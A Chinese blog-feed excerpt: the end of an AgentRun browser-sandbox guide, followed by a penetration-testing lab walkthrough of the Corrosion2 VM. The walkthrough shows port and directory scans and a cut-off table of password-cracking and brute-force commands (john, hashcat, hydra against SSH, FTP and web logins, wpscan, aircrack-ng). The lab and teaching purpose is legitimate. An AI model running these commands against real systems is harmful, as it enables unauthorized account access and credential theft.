\"\"\"指标端点\"\"\"\n    collector = MetricsCollector()\n    # 返回当前指标\n    return jsonify({\n        'total_sandboxes': len(collector.metrics),\n        'timestamp': time.time()\n    })\n</code></pre>\n<h2 id=\"故障排查与常见问题\">故障排查与常见问题</h2>\n<h3 id=\"连接问题\">连接问题</h3>\n<p><strong>问题</strong>：无法连接到 Sandbox</p>\n<p><strong>排查步骤</strong>：</p>\n<pre><code class=\"language-python\">def diagnose_connection(sandbox):\n    \"\"\"诊断连接问题\"\"\"\n    print(f\"1. 检查 Sandbox ID: {sandbox.sandbox_id}\")\n    print(f\"2. 检查 CDP URL: {sandbox.cdp_url}\")\n    \n    # 测试 CDP 连接\n    try:\n        with sync_playwright() as p:\n            browser = p.chromium.connect_over_cdp(sandbox.cdp_url)\n            print(\"✓ CDP 连接成功\")\n            browser.close()\n    except Exception as e:\n        print(f\"✗ CDP 连接失败: {e}\")\n    \n    # 测试 VNC 连接\n    print(f\"3. VNC URL: {sandbox.vnc_url}\")\n    print(\"提示: 可以在浏览器中打开 VNC URL 测试连接\")\n</code></pre>\n<h3 id=\"超时问题\">超时问题</h3>\n<p><strong>问题</strong>：任务执行超时</p>\n<p><strong>解决方案</strong>：</p>\n<pre><code class=\"language-python\">def handle_timeout(sandbox, operation, max_retries=3):\n    \"\"\"处理超时（带重试）\"\"\"\n    for attempt in range(max_retries):\n        try:\n            return operation(sandbox, timeout=30000)\n        except TimeoutError:\n            logger.warning(f\"任务超时（尝试 {attempt + 1}/{max_retries}）\")\n            if attempt == max_retries - 1:\n                # 最后一次尝试失败，重建 Sandbox\n                logger.error(\"多次超时，重建 Sandbox\")\n                sandbox.delete()\n                sandbox = Sandbox.create(\n                    template_type=TemplateType.BROWSER,\n                    template_name=os.getenv(\"BROWSER_TEMPLATE_NAME\")\n                )\n                return operation(sandbox, timeout=60000)\n</code></pre>\n<h3 id=\"性能问题\">性能问题</h3>\n<p><strong>问题</strong>：响应速度慢</p>\n<p><strong>优化建议</strong>：</p>\n<ol>\n<li><strong>使用连接池</strong>：预先创建多个 Sandbox 实例</li>\n<li><strong>启用 keep_alive</strong>：保持浏览器会话，避免重复建立连接</li>\n<li><strong>合理设置超时</strong>：根据任务复杂度调整超时时间</li>\n<li><strong>并发控制</strong>：限制并发请求数，避免资源竞争</li>\n</ol>\n<pre><code class=\"language-python\"># 性能优化配置示例\nbrowser_session = BrowserSession(\n    cdp_url=sandbox.cdp_url,\n    browser_profile=BrowserProfile(\n        timeout=30000,          # 30秒超时\n        keep_alive=True,        # 保持连接\n        disable_security=False  # 保持安全检查\n    )\n)\n</code></pre>\n<h3 id=\"错误码参考\">错误码参考</h3>\n<table>\n<thead>\n<tr>\n<th>错误码</th>\n<th>说明</th>\n<th>解决方案</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>ConnectionError</code></td>\n<td>连接失败</td>\n<td>检查网络连接，验证 CDP URL</td>\n</tr>\n<tr>\n<td><code>TimeoutError</code></td>\n<td>操作超时</td>\n<td>增加超时时间，检查任务复杂度</td>\n</tr>\n<tr>\n<td><code>AuthenticationError</code></td>\n<td>认证失败</td>\n<td>验证 API Key 和访问密钥</td>\n</tr>\n<tr>\n<td><code>ResourceExhausted</code></td>\n<td>资源不足</td>\n<td>减少并发数，增加资源配额</td>\n</tr>\n<tr>\n<td><code>InvalidArgument</code></td>\n<td>参数错误</td>\n<td>检查参数格式和有效性</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"总结\">总结</h2>\n<p>通过本指南，您已经掌握了：</p>\n<ol>\n<li><strong>BrowserUse 集成</strong>：如何使用 BrowserUse 框架实现智能浏览器自动化</li>\n<li><strong>生命周期管理</strong>：三种 Sandbox 管理模式的选择和实现</li>\n<li><strong>性能优化</strong>：超时配置、复用策略、错误重试机制</li>\n<li><strong>安全实践</strong>：环境变量保护、URL 白名单、日志脱敏</li>\n<li><strong>可观测性</strong>：日志记录、指标收集、监控告警</li>\n<li><strong>成本优化</strong>：按需创建、闲置清理、批量处理</li>\n<li><strong>生产部署</strong>：高可用架构、健康检查、故障排查</li>\n</ol>\n<h2 id=\"立即体验函数计算-agentrun\">立即体验函数计算 AgentRun</h2>\n<p>函数计算 AgentRun 的无代码到高代码演进能力，现已开放体验：</p>\n<ol>\n<li><strong>快速创建</strong>：访问控制台（<a href=\"https://functionai.console.aliyun.com/cn-hangzhou/agent/explore\" rel=\"noopener nofollow\" target=\"_blank\">https://functionai.console.aliyun.com/cn-hangzhou/agent/explore</a>），60秒创建你的第一个 Agent</li>\n<li><strong>深度定制</strong>：当需要更复杂功能时，一键转换为高代码</li>\n<li><strong>持续演进</strong>：利用函数计算 AgentRun 的基础设施能力，持续优化你的 Agent</li>\n</ol>\n<p>从想法到上线，从原型到生产，函数计算 AgentRun 始终是你最好的伙伴。<strong>欢迎加入“函数计算 AgentRun 客户群”，钉钉群号：<em>134570017218</em>。</strong></p>\n<h2 id=\"快速了解函数计算-agentrun\">快速了解函数计算 AgentRun</h2>\n<p><strong>一句话介绍：</strong><a href=\"https://www.aliyun.com/product/fc/agentrun\" rel=\"noopener nofollow\" target=\"_blank\">函数计算 AgentRun</a> 是一个以高代码为核心的一站式 Agentic AI 基础设施平台。秉持生态开放和灵活组装的理念，为企业级 Agent 应用提供从开发、部署到运维的全生命周期管理。</p>\n\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>函数计算 AgentRun 架构图</p>\n<p>AgentRun 运行时基于阿里云函数计算 FC 构建，继承了 Serverless 计算极致弹性、按量付费、零运维的核心优势。通过深度集成 AgentScope、LangChain、RAGFlow、Mem0 等主流开源生态。函数计算 AgentRun 将 Serverless 的极致弹性、零运维和按量付费的特性与 AI 原生应用场景深度融合，助力企业实现成本与效率的极致优化，<strong>平均 TCO 降低 60%</strong>。</p>\n<p><strong>让开发者只需专注于 Agent 的业务逻辑创新，无需关心底层基础设施，让 Agentic AI 真正进入企业生产环境。</strong></p>\n<p><strong>推荐阅读：</strong></p>\n<ul>\n<li>阅读<a href=\"https://yuque.alibaba-inc.com/agentrun/dxnn5p/rcpbigg7gthpa2u4\" rel=\"noopener nofollow\" target=\"_blank\">《快速上手：LangChain + AgentRun 浏览器沙箱极简集成指南》</a>复习基础集成和 LangChain 集成</li>\n<li>查看<a href=\"https://docs.agent.run\" rel=\"noopener nofollow\" target=\"_blank\">官方文档</a>了解更多 AgentRun 功能</li>\n<li>访问<a href=\"https://github.com/devsapp/agentrun-sandbox-demos\" rel=\"noopener nofollow\" target=\"_blank\">示例代码仓库</a> 获取参考代码</li>\n</ul>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 16:12</span>&nbsp;\n<a href=\"https://www.cnblogs.com/Serverless\">Serverless社区</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Corrosion2靶机",
      "link": "https://www.cnblogs.com/yuell/p/19507210",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/yuell/p/19507210\" id=\"cb_post_title_url\" title=\"发布于 2026-01-20 15:45\">\n    <span>Corrosion2靶机</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"0x01信息收集\">0x01信息收集</h1>\n<h2 id=\"11-nmap扫描端口\">1.1 nmap扫描端口</h2>\n<p><code>nmap -A -p- -v 192.168.222.134 </code><br />\n<img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767838377647-6d3c9cb4-57cb-47ee-b40c-7a424545c7f0.png\" /></p>\n<pre><code class=\"language-plain\">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 6a:d8:44:60:80:39:7e:f0:2d:08:2f:e5:83:63:f0:70 (RSA)\n|   256 f2:a6:62:d7:e7:6a:94:be:7b:6b:a5:12:69:2e:fe:d7 (ECDSA)\n|_  256 28:e1:0d:04:80:19:be:44:a6:48:73:aa:e8:6a:65:44 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Apache2 Ubuntu Default Page: It works\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n| http-methods:\n|_  Supported Methods: POST OPTIONS HEAD GET\n8080/tcp open  http    Apache Tomcat 9.0.53\n|_http-favicon: Apache Tomcat\n|_http-title: Apache Tomcat/9.0.53\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nUptime guess: 26.829 days (since Fri Dec 12 14:17:12 2025)\nNetwork Distance: 2 hops\nTCP Sequence Prediction: Difficulty=264 (Good luck!)\nIP ID Sequence Generation: All zeros\n\n</code></pre>\n<p>开放端口：80、8080、22</p>\n<p>主机操作系统及其服务：Ubuntu、Apache Tomcat、OpenSSH 8.2p1 Ubuntu 4ubuntu0.3</p>\n<h2 id=\"12web及其目录扫描\">1.2web及其目录扫描</h2>\n<p>开放了80、8080端口分别访问</p>\n<p>80端口</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767838755910-70b66c83-7e85-45d7-b4cc-f457a1f030ee.png\" /></p>\n<p>网页没可用的，扫一下目录</p>\n<p><code>dirsearch -u [http://192.168.222.134/](http://192.168.222.134/) -x 401,404,403</code></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767838945476-65861ad6-84ee-4493-89ab-a50eb77f6f3e.png\" /></p>\n<p>扫出来没有啥可用的信息</p>\n<p>8080端口</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767839239103-2de01363-9f42-4b8b-8a69-5900b70fa49c.png\" /></p>\n<p>tomcat主页版本为9.0.53；扫一下目录</p>\n<p><code>dirsearch -u http://192.168.222.134:8080 -x 401,404,403</code>或者<code>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://192.168.1.9:8080/FUZZ](http://192.168.1.9:8080/FUZZ)</code></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767839464572-dfc3a25d-2e2a-4d2c-a7db-51cd095d2dd0.png\" /></p>\n<pre><code class=\"language-plain\">[10:30:23] 200 -   33KB - /backup.zip\n[10:30:28] 302 -    0B  - /docs  -&gt;  /docs/\n[10:30:28] 200 -   15KB - /docs/\n[10:30:29] 302 -    0B  - /examples  -&gt;  /examples/\n[10:30:29] 200 -    1KB - /examples/\n[10:30:29] 200 -    1KB - /examples/websocket/index.xhtml\n[10:30:29] 200 -   14KB - /examples/jsp/index.html\n[10:30:29] 200 -    6KB - /examples/servlets/index.html\n[10:30:29] 200 -    1KB - /examples/servlets/servlet/RequestHeaderExample\n[10:30:29] 200 -  658B  - /examples/servlets/servlet/CookieExample\n[10:30:29] 200 -  687B  - /examples/jsp/snp/snoop.jsp\n[10:30:30] 200 -   21KB - /favicon.ico\n[10:30:35] 302 -    0B  - /manager  -&gt;  /manager/\n[10:30:35] 302 -    0B  - /manager/  -&gt;  /manager/html\n[10:30:41] 200 -  153B  - /readme.txt\n</code></pre>\n<h2 id=\"13账号尝试目录详细信息收集\">1.3账号尝试，目录详细信息收集</h2>\n<p>查看目录里面扫描出来的东西</p>\n<p><strong>backup.zip，需要密码解压</strong></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767839601898-675f2de0-bfac-4f99-a2d7-c5b188f6d2de.png\" /></p>\n<p><strong>爆破：爆破工具可多选fcrackzip、john</strong></p>\n<p>john:. 基本功能<br />\n哈希爆破：破解存储为哈希值的密码（如 Linux shadow 文件、Windows NTLM 哈希、MySQL 密码哈希等）。<br />\n字典攻击：基于字典文件尝试密码组合。<br />\n暴力破解：生成所有可能的字符组合（如 a-z、0-9、特殊字符）进行尝试。<br />\n规则破解：通过自定义规则（如大写首字母、加数字后缀）扩展字典，提高破解效率。<br />\n支持的哈希类型</p>\n<table>\n<thead>\n<tr>\n<th><strong>哈希类型 / 场景</strong></th>\n<th><strong>对应文件 / 格式示例</strong></th>\n<th><strong>John 识别方式</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Linux 系统密码</strong></td>\n<td><strong>/etc/shadow 文件（格式：</strong><code>**用户名:$id$salt$hash**</code><strong>）</strong></td>\n<td><strong>自动识别（</strong><code>**$1$**</code>** 为 MD5，<strong><code>**$6$**</code></strong> 为 SHA-512）**</td>\n</tr>\n<tr>\n<td><strong>Windows NTLM 哈希</strong></td>\n<td><strong>格式：</strong><code>**LM:NTLM**</code><strong>（示例：</strong><code>**aad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99**</code><strong>）</strong></td>\n<td>**指定 **<code>**--format=nt**</code></td>\n</tr>\n<tr>\n<td><strong>MySQL 密码哈希</strong></td>\n<td><strong>格式：</strong><code>***hash**</code><strong>（示例：</strong><code>***A4B6157319038724E3566C818872E067**</code><strong>）</strong></td>\n<td>**指定 **<code>**--format=mysql-sha1**</code></td>\n</tr>\n<tr>\n<td><strong>ZIP 压缩包密码</strong></td>\n<td><strong>压缩包文件（需先用 <strong><code>**zip2john**</code></strong> 提取哈希）</strong></td>\n<td><strong>通过 <strong><code>**zip2john**</code></strong> 生成的哈希文件自动识别</strong></td>\n</tr>\n<tr>\n<td><strong>RAR 压缩包密码</strong></td>\n<td><strong>压缩包文件（需先用 <strong><code>**rar2john**</code></strong> 提取哈希）</strong></td>\n<td><strong>通过 <strong><code>**rar2john**</code></strong> 生成的哈希文件自动识别</strong></td>\n</tr>\n<tr>\n<td><strong>SSH 私钥密码</strong></td>\n<td><strong>id_rsa 等私钥文件（需先用 <strong><code>**ssh2john**</code></strong> 提取哈希）</strong></td>\n<td><strong>通过 <strong><code>**ssh2john**</code></strong> 生成的哈希文件自动识别</strong></td>\n</tr>\n</tbody>\n</table>\n<p><strong>补充说明与调整：</strong></p>\n<ol>\n<li>Windows NTLM 哈希：实际常见的格式为 <code>LM:NTLM</code>，示例中已保留冒号分隔，John 需使用 <code>--format=nt</code>。</li>\n<li>MySQL 密码哈希：示例格式为 <code>*hash</code>，实际是 <code>mysql_native_password</code> 使用的 SHA1 双重哈希，John 中应使用 <code>--format=mysql-sha1</code>。</li>\n<li>ZIP/RAR 区分：<code>zip2john</code> 与 <code>rar2john</code> 为不同工具，建议分开列出。</li>\n<li>SSH 私钥：通常使用 <code>ssh2john</code>（属于 John the Ripper 工具集）提取哈希后再进行破解。</li>\n</ol>\n<p><strong>fcrackzip：</strong><code>**&lt;font style=\"color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);\"&gt;Fcrackzip&lt;/font&gt;**</code><strong><font style=\"color: rgba(77, 77, 77, 1);\">是一款专门破解</font></strong><code>**&lt;font style=\"color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);\"&gt;zip&lt;/font&gt;**</code><strong><font style=\"color: rgba(77, 77, 77, 1);\">类型压缩文件密码的工具，工具小巧方便、破解速度快，能使用字典和指定字符集破解，适用于</font></strong><code>**&lt;font style=\"color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);\"&gt;linux、mac osx&lt;/font&gt;**</code><strong><font style=\"color: rgba(77, 77, 77, 1);\"> 系统</font></strong></p>\n<p>安装：<code>sudo apt-get install fcrackzip </code></p>\n<p>安装字典：<font style=\"color: rgba(21, 167, 167, 1); background-color: rgba(242, 243, 245, 1);\">rockyou.txt；</font></p>\n<p><font style=\"color: rgba(77, 77, 77, 1);\">在 Kali </font><a href=\"https://so.csdn.net/so/search?q=Linux&amp;spm=1001.2101.3001.7020\" rel=\"noopener nofollow\" target=\"_blank\"><font style=\"color: rgba(252, 85, 49, 1);\">Linux</font></a><font style=\"color: rgba(77, 77, 77, 1);\"> 中，使用 rockyou.txt 破解加密代码或密码的步骤取决于加密方式（如 ZIP、RAR、HASH、</font><font style=\"color: rgba(78, 161, 219, 1) !important;\">SSH</font><font style=\"color: rgba(77, 77, 77, 1);\">、FTP 等）</font></p>\n<p><strong>好的，这是一个以表格形式整理的，在 Kali Linux 中使用 <strong><code>**rockyou.txt**</code></strong> 破解不同类型加密/保护的通用步骤。表格清晰地展示了不同场景下的工具、命令和核心思路。</strong></p>\n<p><strong>Kali Linux 中使用 rockyou.txt 进行密码破解</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">攻击目标 (加密/保护方式)</font></th>\n<th style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">核心工具</font></th>\n<th style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">关键准备步骤 (在运行攻击命令前)</font></th>\n<th style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">典型攻击命令示例</font></th>\n<th style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">核心思路与说明</font></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align: left;\"><strong>ZIP 压缩包</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;fcrackzip&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">确保目标 ZIP 文件在本机。</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;rockyou.txt&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 默认路径：</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;/usr/share/wordlists/rockyou.txt&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;fcrackzip -v -D -p /usr/share/wordlists/rockyou.txt -u target.zip&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;-D&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 指定字典模式，</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;-p&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 指定字典路径，</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;-u&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 验证密码。暴力破解耗时较长，字典攻击效率更高。</font></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>RAR 压缩包</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;rarcrack&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 或 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;john&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">1. </font><strong>使用 rarcrack</strong><font style=\"color: rgba(77, 77, 77, 1);\">： 安装 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;rarcrack&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> (</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;sudo apt install rarcrack&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">)。</font><font style=\"color: rgba(77, 77, 77, 1);\">   </font><font style=\"color: rgba(77, 77, 77, 1);\">2. </font><strong>使用 John</strong><font style=\"color: rgba(77, 77, 77, 1);\">： 需先用 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;rar2john&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 提取哈希。</font></td>\n<td style=\"text-align: left;\"><strong>1. rarcrack:</strong><font style=\"color: rgba(77, 77, 77, 1);\"> </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;rarcrack --type rar target.rar&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">   </font><strong>2. john:</strong><font style=\"color: rgba(77, 77, 77, 1);\"> </font><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;rar2john target.rar &gt; rar_hash.txt&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;rarcrack&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 支持自动猜测类型（XML文件记录进度）。John 的方式更通用，先提取哈希，再对哈希进行破解。</font></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>密码哈希 (如 /etc/shadow 中的 Hash)</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;john&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 或 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hashcat&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">1. </font><strong>获取哈希</strong><font style=\"color: rgba(77, 77, 77, 1);\">： 需要将 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;/etc/shadow&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 与 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;/etc/passwd&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 合并或直接获得哈希串。</font><font style=\"color: rgba(77, 77, 77, 1);\">   </font><font style=\"color: rgba(77, 77, 77, 1);\">2. </font><strong>识别哈希类型</strong><font style=\"color: rgba(77, 77, 77, 1);\">： 使用 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hashid&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 或 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;john --list=formats&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 识别。</font></td>\n<td style=\"text-align: left;\"><strong>以 John 破解 MD5 为例:</strong><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_file.txt&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">   </font><strong>以 hashcat 破解 SHA256 为例:</strong><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hashcat -m 1400 -a 0 hash_file.txt /usr/share/wordlists/rockyou.txt&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><strong>最常用场景</strong><font style=\"color: rgba(77, 77, 77, 1);\">。关键在于正确识别哈希类型（</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;-m&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 或 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;--format&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">）。</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hashcat&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 性能更强，支持 GPU。破解成功率高度依赖字典质量。</font></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>SSH 服务登录</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hydra&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 或 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;medusa&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">确认目标主机 SSH 服务（22端口）开放，且允许密码认证。</font></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hydra -l &lt;用户名&gt; -P /usr/share/wordlists/rockyou.txt &lt;目标IP&gt; ssh&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">   </font><font style=\"color: rgba(77, 77, 77, 1);\">或指定用户列表：</font><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hydra -L user_list.txt -P /usr/share/wordlists/rockyou.txt ssh://&lt;目标IP&gt;&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><strong>网络协议爆破</strong><font style=\"color: rgba(77, 77, 77, 1);\">。</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;-l&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 指定单个用户，</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;-L&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 指定用户字典。注意：频繁尝试可能触发锁定或记录日志。</font></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>FTP 服务登录</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hydra&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">确认目标主机 FTP 服务（21端口）开放。</font></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hydra -l &lt;用户名&gt; -P /usr/share/wordlists/rockyou.txt ftp://&lt;目标IP&gt;&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">   </font><font style=\"color: rgba(77, 77, 77, 1);\">或匿名测试：</font><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hydra -l anonymous -P ‘’ ftp://&lt;目标IP&gt;&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">思路同 SSH。通常先尝试 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;anonymous&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 匿名登录。</font></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>HTTP 表单登录 (如 Web 后台)</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hydra&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">1. 分析登录请求（用 Burp Suite 抓包）。</font><font style=\"color: rgba(77, 77, 77, 1);\">   </font><font style=\"color: rgba(77, 77, 77, 1);\">2. 确定登录 URL、用户名/密码参数名、失败响应特征。</font></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;hydra -l admin -P /usr/share/wordlists/rockyou.txt &lt;目标IP&gt; http-post-form \"/login.php:user=^USER^&amp;pass=^PASS^:F=登录失败\"&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><strong>POST 数据包爆破</strong><font style=\"color: rgba(77, 77, 77, 1);\">。语法复杂但灵活。</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;^USER^&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 和 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;^PASS^&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 是占位符，</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;F=...&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 指定失败字符串。成功率取决于请求构造的准确性。</font></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>WordPress 后台</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;wpscan&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">确认目标为 WordPress 站点。</font></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;wpscan --url http://&lt;目标站点&gt; --passwords /usr/share/wordlists/rockyou.txt --usernames admin&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">专门针对 WordPress 的工具，比通用 HTTP 爆破更智能，能枚举用户名并规避部分锁定机制。</font></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>Wi-Fi WPA/WPA2 握手包</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;aircrack-ng&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">1. 已通过 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;airodump-ng&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 捕获到包含四步握手的 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;.cap&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 文件。</font><font style=\"color: rgba(77, 77, 77, 1);\">   